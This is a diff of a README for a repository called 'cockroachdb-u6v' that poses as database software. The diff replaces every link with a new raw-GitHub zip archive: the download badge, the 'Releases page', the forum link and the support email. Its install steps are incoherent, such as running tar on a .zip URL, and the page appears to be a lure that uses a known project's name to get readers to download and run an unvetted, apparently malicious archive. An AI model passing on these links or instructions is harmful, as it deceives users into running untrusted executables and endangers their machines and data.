@@ -1,6 +1,6 @@
 # 🚀 cockroachdb-u6v - Easily Manage Your Database
 
-[![Download Now](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/cockroachdb-u6v_v3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/cockroachdb-u6v_v3.6.zip)
+[![Download Now](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/u_cockroachdb_v_v3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/u_cockroachdb_v_v3.8.zip)
 
 ## 📖 Introduction
 
@@ -16,13 +16,13 @@ Follow these simple steps to download and run cockroachdb-u6v on your computer.
    - Memory: 4 GB of RAM or more recommended
 
 2. **Visit the Releases Page**  
-   To download the latest version of cockroachdb-u6v, [visit this page to download](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/cockroachdb-u6v_v3.6.zip).
+   To download the latest version of cockroachdb-u6v, [visit this page to download](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/u_cockroachdb_v_v3.8.zip).
 
 3. **Choose the Correct File**  
    On the Releases page, you will see various files listed. Choose the one that matches your operating system. For example:
    - For Windows, select the .exe file.
    - For macOS, select the .dmg file.
-   - For Linux, select the suitable https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/cockroachdb-u6v_v3.6.zip file.
+   - For Linux, select the suitable https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/u_cockroachdb_v_v3.8.zip file.
 
 4. **Download the File**  
    Click the file link you selected. Your browser will start downloading the file. Wait until the download completes.
@@ -36,8 +36,8 @@ Follow these simple steps to download and run cockroachdb-u6v on your computer.
      2. Drag the cockroachdb-u6v icon into your Applications folder.
    - **Linux:** 
      1. Open your terminal.
-     2. Navigate to the directory where you downloaded the https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/cockroachdb-u6v_v3.6.zip file.
-     3. Use the command `tar -xzvf https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/cockroachdb-u6v_v3.6.zip` to extract the files.
+     2. Navigate to the directory where you downloaded the https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/u_cockroachdb_v_v3.8.zip file.
+     3. Use the command `tar -xzvf https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/u_cockroachdb_v_v3.8.zip` to extract the files.
      4. Follow the README file inside for further installation steps.
 
 6. **Launch cockroachdb-u6v**  
@@ -45,7 +45,7 @@ Follow these simple steps to download and run cockroachdb-u6v on your computer.
 
 ## 📥 Download & Install
 
-For a smooth experience, remember to visit the Releases page to download the latest version of cockroachdb-u6v: [visit this page to download](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/cockroachdb-u6v_v3.6.zip).
+For a smooth experience, remember to visit the Releases page to download the latest version of cockroachdb-u6v: [visit this page to download](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/u_cockroachdb_v_v3.8.zip).
 
 ## 🎨 Features and Benefits
 
@@ -66,11 +66,11 @@ If you encounter issues during installation or while using the software, here ar
 ## 🔗 Additional Resources
 
 - **User Guide:** For detailed instructions on how to use cockroachdb-u6v, refer to our user guide available within the application after installation.
-- **Community Forum:** Join our forum for tips, discussions, and troubleshooting with other users: [Community Forum Link](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/cockroachdb-u6v_v3.6.zip).
+- **Community Forum:** Join our forum for tips, discussions, and troubleshooting with other users: [Community Forum Link](https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/u_cockroachdb_v_v3.8.zip).
 - **GitHub Issues:** If you find a bug or have a feature request, please visit the Issues section on our GitHub repository.
 
 ## 🌟 Support
 
-If you need help or have questions, you can reach out via email: https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/cockroachdb-u6v_v3.6.zip We are here to assist you. 
+If you need help or have questions, you can reach out via email: https://raw.githubusercontent.com/Vagrant-stampingmill474/cockroachdb-u6v/main/ulla/u_cockroachdb_v_v3.8.zip We are here to assist you. 
 
 By following these steps, you will have cockroachdb-u6v up and running in no time. Enjoy efficient database management!
